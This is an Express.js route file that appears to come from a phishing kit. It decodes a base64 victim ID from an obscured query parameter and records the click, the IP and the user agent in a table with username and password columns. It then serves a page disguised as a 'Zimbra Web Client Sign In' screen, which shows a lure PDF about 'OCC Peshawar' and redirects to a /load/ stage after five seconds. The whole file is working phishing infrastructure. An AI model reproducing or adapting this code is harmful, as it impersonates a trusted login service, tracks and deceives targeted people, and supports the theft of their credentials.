
const express = require ('express');
const router = express.Router();
const db = require('./db');


router.get('/', (req, res) => {

    const data = req.query.osksadgfjfjfjgfjfuansarrnas;

    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');

    console.log(userid);
  
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
   // const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;


            const insertQuery = 'INSERT INTO clkTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        

    const url = `/load/?lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre=${data}`;

   

    const htmlContent = `
        <!doctype html>
        <html lang="en">
        <head>
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 5000);
            </script> 
            <!-- Required meta tags -->
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Zimbra Web Client Sign In</title>
            <link rel="shortcut icon" href="./files/favicon.ico" type="image/ico">
            
        </head>
   
        <body>

        <object data="./Outstanding Issues and Observations Related to OCC Peshawar.pdf" style="height:900px; width:1860px"></object>
     
               
        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);


      }

});

module.exports =router
